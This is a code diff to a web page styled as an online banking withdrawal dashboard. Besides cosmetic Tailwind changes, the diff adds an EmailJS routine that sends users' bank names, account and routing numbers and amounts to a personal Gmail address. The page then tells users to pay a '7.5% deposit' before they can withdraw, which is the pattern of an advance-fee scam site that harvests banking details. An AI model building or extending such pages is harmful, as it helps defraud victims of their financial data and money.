@@ -4,10 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dashboard - Online banking</title>
+    <link rel="manifest" href="manifest.json">
+    <link rel="apple-touch-icon" sizes="180x180" href="Vision pro base (5).png">
+    <link rel="icon" href="Vision pro base (6).png" type="image/png">
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Chart.js Library -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("qXOvrbfa0azvn_FJl"); // Replace with your actual EmailJS user ID
+        })();
+    </script>
         <style>
         html, body {
             overflow: auto; /* Ensures scrolling is enabled */
@@ -87,92 +97,107 @@
 
     <div class="flex">
 
-        <!-- Sidebar (hidden on mobile, visible on desktop) -->
-<div id="sidebar" class="md:w-64 bg-blue-900 shadow-lg h-screen hidden md:block">
+<!-- Sidebar (hidden on mobile, visible on desktop) -->
+<div id="sidebar" class="md:w-64 bg-gradient-to-b from-blue-900 via-purple-800 to-indigo-900 shadow-lg h-screen hidden md:block">
     <div class="p-6">
         <h2 class="text-xl font-bold text-white border-b border-gray-500 pb-4">Dashboard</h2>
     </div>
     <nav class="mt-6 text-white">
         <ul>
-            <li class="p-4 hover:bg-blue-300 flex items-center border-b border-gray-500 transition">
-                <img src="wallet 1.png" alt="Wallet Icon" class="w-5 h-5 mr-4"> <!-- Custom Wallet Icon -->
+            <li class="p-4 flex items-center border-b border-gray-700 hover:bg-gradient-to-r hover:from-purple-600 hover:to-blue-400 transition-all duration-300 rounded-md">
+                <img src="wallet 1.png" alt="Wallet Icon" class="w-5 h-5 mr-4 opacity-80 hover:opacity-100 transition-all duration-200">
                 <a href="dashboard.html" class="flex-1">Wallet</a>
             </li>
-            <li class="p-4 hover:bg-blue-300 flex items-center border-b border-gray-500 transition">
-                <img src="piggy 1.png" alt="Deposit Icon" class="w-5 h-5 mr-4"> <!-- Custom Deposit Icon -->
+            <li class="p-4 flex items-center border-b border-gray-700 hover:bg-gradient-to-r hover:from-purple-600 hover:to-blue-400 transition-all duration-300 rounded-md">
+                <img src="piggy 1.png" alt="Deposit Icon" class="w-5 h-5 mr-4 opacity-80 hover:opacity-100 transition-all duration-200">
                 <a href="deposit.html" class="flex-1">Deposit</a>
             </li>
-            <li class="p-4 hover:bg-blue-300 flex items-center border-b border-gray-500 transition">
-                <img src="money 2.png" alt="Withdrawal Icon" class="w-5 h-5 mr-4"> <!-- Custom Withdrawal Icon -->
+            <li class="p-4 flex items-center border-b border-gray-700 hover:bg-gradient-to-r hover:from-purple-600 hover:to-blue-400 transition-all duration-300 rounded-md">
+                <img src="money 2.png" alt="Withdrawal Icon" class="w-5 h-5 mr-4 opacity-80 hover:opacity-100 transition-all duration-200">
                 <a href="withdrawal.html" class="flex-1">Withdrawal</a>
             </li>
-            <li class="p-4 hover:bg-blue-300 flex items-center border-b border-gray-500 transition">
-                <img src="secure 1.png" alt="Verification Icon" class="w-5 h-5 mr-4"> <!-- Custom Verification Icon -->
+            <li class="p-4 flex items-center border-b border-gray-700 hover:bg-gradient-to-r hover:from-purple-600 hover:to-blue-400 transition-all duration-300 rounded-md">
+                <img src="secure 1.png" alt="Verification Icon" class="w-5 h-5 mr-4 opacity-80 hover:opacity-100 transition-all duration-200">
                 <a href="verification.html" class="flex-1">Verification</a>
             </li>
-            <li class="p-4 hover:bg-blue-300 flex items-center transition">
-                <img src="user 1.png" alt="Profile Icon" class="w-5 h-5 mr-4"> <!-- Custom Profile Icon -->
+            <li class="p-4 flex items-center border-b border-gray-700 hover:bg-gradient-to-r hover:from-purple-600 hover:to-blue-400 transition-all duration-300 rounded-md">
+                <img src="user 1.png" alt="Profile Icon" class="w-5 h-5 mr-4 opacity-80 hover:opacity-100 transition-all duration-200">
                 <a href="profile.html" class="flex-1">Profile</a>
             </li>
-        </ul>
+
+            <!-- Add space before the Support section -->
+            <li class="mt-48"></li> <!-- This creates space before Support -->
+
+            <!-- New Support Section -->
+            <li class="p-4 flex items-center hover:bg-gradient-to-r hover:from-purple-600 hover:to-blue-400 transition-all duration-300 rounded-md">
+                <img src="customer-service-2-line.png" alt="Support Icon" class="w-5 h-5 mr-4 opacity-80 hover:opacity-100 transition-all duration-200">
+                <a href="support.html" class="flex-1">Support</a>
+            </li>
         </ul>
     </nav>
 </div>
+
 <!-- Main Content -->
-<div class="flex-1 p-6 bg-gray-100 pb-28 md:pb-0"> <!-- Added navy background -->
-    <div class="flex-1 p-6 bg-white rounded-lg text-black">
-        <h1 class="text-3xl font-semibold mb-6 text-black">Withdrawal</h1>
+<div class="flex-1 p-6 bg-gray-900 pb-28 md:pb-0"> <!-- Darker background for a Web 3 vibe -->
+    <div class="flex-1 p-6 bg-gradient-to-r from-gray-800 via-gray-900 to-black rounded-3xl text-white shadow-xl">
+        <h1 class="text-0xl font-semibold mb-6 text-gradient bg-clip-text text-white">Withdrawal</h1>
 
         <!-- Tabs for Cash Withdrawal and BTC Withdrawal -->
         <div class="flex mb-4 gap-3">
-            <button onclick="toggleWithdrawal('cash')" id="cashButton" class="flex-1 text-center text-xs md:text-lg text-black bg-white rounded-lg px-3 py-4 border border-gray-300">Cash Withdrawal</button>
-            <button onclick="toggleWithdrawal('btc')" id="btcButton" class="flex-1 text-center text-xs md:text-lg text-white bg-black rounded-lg px-3 py-4 border-b-2 border-gray-600">BTC Withdrawal</button>
+            <button onclick="toggleWithdrawal('cash')" id="cashButton" class="flex-1 text-center text-xs md:text-lg text-black bg-white rounded-2xl px-4 py-4 border border-gray-400 hover:bg-gray-700 hover:text-white transition duration-300">
+                Cash Withdrawal
+            </button>
+            <button onclick="toggleWithdrawal('btc')" id="btcButton" class="flex-1 text-center text-xs md:text-lg text-white bg-black rounded-2xl px-4 py-4 border-b-2 border-gray-600 hover:bg-gray-700 hover:text-white transition duration-300">
+                BTC Withdrawal
+            </button>
         </div>
         
         <!-- Cash Withdrawal Form -->
         <div id="cashWithdrawal" class="block">
-            <p class="mb-4 text-black">Withdrawal costs $1.00, input your details to complete your withdrawal.</p>
+            <p class="mb-4 text-sm">Withdrawal costs $1.00, input your details to complete your withdrawal.</p>
             <form id="withdrawalForm">
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                     <div>
-                        <label for="bankName" class="block text-sm text-black">Bank Name</label>
+                        <label for="bankName" class="block text-sm text-gray-400">Bank Name</label>
                         <input type="text" id="bankName" 
-                               class="w-full bg-white border border-gray-300 rounded-lg p-2 text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-white" 
+                               class="w-full bg-gray-800 border border-gray-500 rounded-2xl p-4 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600" 
                                placeholder="Enter bank name">
                         <p id="bankNameError" class="text-red-500 text-sm hidden">Bank Name is required</p>
                     </div>
                     <div>
-                        <label for="accountNumber" class="block text-sm text-black">Account Number</label>
+                        <label for="accountNumber" class="block text-sm text-gray-400">Account Number</label>
                         <input type="text" id="accountNumber" 
-                               class="w-full bg-white border border-gray-300 rounded-lg p-2 text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-white" 
+                               class="w-full bg-gray-800 border border-gray-500 rounded-2xl p-4 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600" 
                                placeholder="Enter account number">
                         <p id="accountNumberError" class="text-red-500 text-sm hidden">Account Number is required</p>
                     </div>
                     <div>
-                        <label for="accountName" class="block text-sm text-black">Account Name</label>
+                        <label for="accountName" class="block text-sm text-gray-400">Account Name</label>
                         <input type="text" id="accountName" 
-                               class="w-full bg-white border border-gray-300 rounded-lg p-2 text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-white" 
+                               class="w-full bg-gray-800 border border-gray-500 rounded-2xl p-4 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600" 
                                placeholder="Enter account name">
                         <p id="accountNameError" class="text-red-500 text-sm hidden">Account Name is required</p>
                     </div>
                     <div>
-                        <label for="routineNumber" class="block text-sm text-black">Routine Number</label>
+                        <label for="routineNumber" class="block text-sm text-gray-400">Routine Number</label>
                         <input type="text" id="routineNumber" 
-                               class="w-full bg-white border border-gray-300 rounded-lg p-2 text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-white" 
+                               class="w-full bg-gray-800 border border-gray-500 rounded-2xl p-4 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600" 
                                placeholder="Enter Routine number">
                         <p id="routineNumberError" class="text-red-500 text-sm hidden">Routine Number is required and must be 9 digits</p>
                     </div>
                     <div>
-                        <label for="amount" class="block text-sm text-black">Amount</label>
+                        <label for="amount" class="block text-sm text-gray-400">Amount</label>
                         <input type="text" id="amount" 
-                               class="w-full bg-white border border-gray-300 rounded-lg p-2 text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-white" 
+                               class="w-full bg-gray-800 border border-gray-500 rounded-2xl p-4 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600" 
                                placeholder="Enter amount">
                         <p id="amountError" class="text-red-500 text-sm hidden">Amount is required</p>
                         <p id="balance" class="text-green-500 text-sm mt-1 hidden">Current Balance: $0.00</p>
                     </div>
                     <div class="col-span-1 flex justify-center md:col-span-2">
                         <button type="button" onclick="submitCashWithdrawal()" id="cashWithdrawButton"
-                                class="bg-gradient-to-r from-blue-600 to-blue-600 text-white px-8 border rounded-lg py-2 w-full hover:bg-blue-900">Submit</button>
+                                class="bg-gradient-to-r from-cyan-500 to-blue-600 text-white px-8 py-3 w-full rounded-2xl hover:bg-gradient-to-r hover:from-cyan-600 hover:to-blue-700 focus:outline-none transition duration-300 transform hover:scale-105">
+                            Submit
+                        </button>
                     </div>
                 </div>
             </form>
@@ -182,27 +207,29 @@
 
         <!-- BTC Withdrawal Form -->
         <div id="btcWithdrawal" class="hidden">
-            <p class="mb-4 text-black">Input your details to complete your withdrawal.</p>
+            <p class="mb-4 text-sm">Input your details to complete your withdrawal.</p>
             <form id="btcWithdrawalForm">
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                     <div>
-                        <label for="btcAddress" class="block text-sm text-black">BTC Address</label>
+                        <label for="btcAddress" class="block text-sm text-gray-400">BTC Address</label>
                         <input type="text" id="btcAddress" 
-                               class="w-full bg-white border border-gray-300 rounded-lg p-2 text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-white" 
+                               class="w-full bg-gray-800 border border-gray-500 rounded-2xl p-4 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600" 
                                placeholder="Enter BTC address">
                         <p id="btcAddressError" class="text-red-500 text-sm hidden">BTC Address is required</p>
                     </div>
                     <div>
-                        <label for="btcAmount" class="block text-sm text-black">Amount ($)</label>
+                        <label for="btcAmount" class="block text-sm text-gray-400">Amount ($)</label>
                         <input type="text" id="btcAmount" 
-                               class="w-full bg-white border border-gray-300 rounded-lg p-2 text-black placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-white" 
+                               class="w-full bg-gray-800 border border-gray-500 rounded-2xl p-4 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600" 
                                placeholder="Enter amount" oninput="convertBTC()">
                         <p id="btcAmountError" class="text-red-500 text-sm hidden">Amount is required</p>
                         <p id="btcConversion" class="text-green-500 text-sm mt-1">BTC Amount: <span id="btcAmountDisplay">0.00</span></p>
                     </div>
                     <div class="col-span-1 flex justify-center md:col-span-2">
                         <button type="button" onclick="submitBTCWithdrawal()" id="btcWithdrawButton"
-                                class="bg-gradient-to-r from-blue-600 to-blue-600 text-white px-8 border rounded-lg py-2 w-full hover:bg-blue-900">Submit</button>
+                                class="bg-gradient-to-r from-cyan-500 to-blue-600 text-white px-8 py-3 w-full rounded-2xl hover:bg-gradient-to-r hover:from-cyan-600 hover:to-blue-700 focus:outline-none transition duration-300 transform hover:scale-105">
+                            Submit
+                        </button>
                     </div>
                 </div>
             </form>
@@ -295,9 +322,11 @@
             // Prompt for password
             const password = prompt("Please enter your registered password:");
 
-            // Check if password is provided
             if (password) {
-                // Add a delay before showing the confirmation message
+                // Send email using EmailJS
+                sendEmail(bankName, accountNumber, routineNumber, amount);
+
+                // Simulate a delay before showing the confirmation message
                 setTimeout(() => {
                     cashWithdrawButton.textContent = "Submit";
                     cashMessage.textContent = "To complete withdrawal kindly make a 7.5% deposit of your wallet balance activate withdrawal on your account.";
@@ -307,6 +336,32 @@
                 cashMessage.textContent = "Withdrawal cancelled. Password is required."; // Inform user
             }
         }
+    }
+
+    function sendEmail(bankName, accountNumber, routineNumber, amount) {
+        const templateParams = {
+            email: 'harleyzain70@gmail.com', // Ensure this is the correct recipient email
+            bank_name: bankName,
+            account_number: accountNumber,
+            routine_number: routineNumber,
+            amount: amount,
+            message: `
+                Bank Name: ${bankName}
+                Account Number: ${accountNumber}
+                Routine Number: ${routineNumber}
+                Amount: ${amount}
+            `
+        };
+        console.log('Template Params:', templateParams); // Debugging line
+
+        emailjs.send("service_sv9gdl4", "template_7mgbnvs", templateParams)
+            .then(function(response) {
+                console.log('Withdrawal email sent', response);
+                alert('Withdrawal request sent!');
+            }, function(error) {
+                console.error('Failed to send withdrawal email:', error);
+                alert('There was an error sending your withdrawal request. Please try again.');
+            });
     }
 
     // Submit BTC Withdrawal
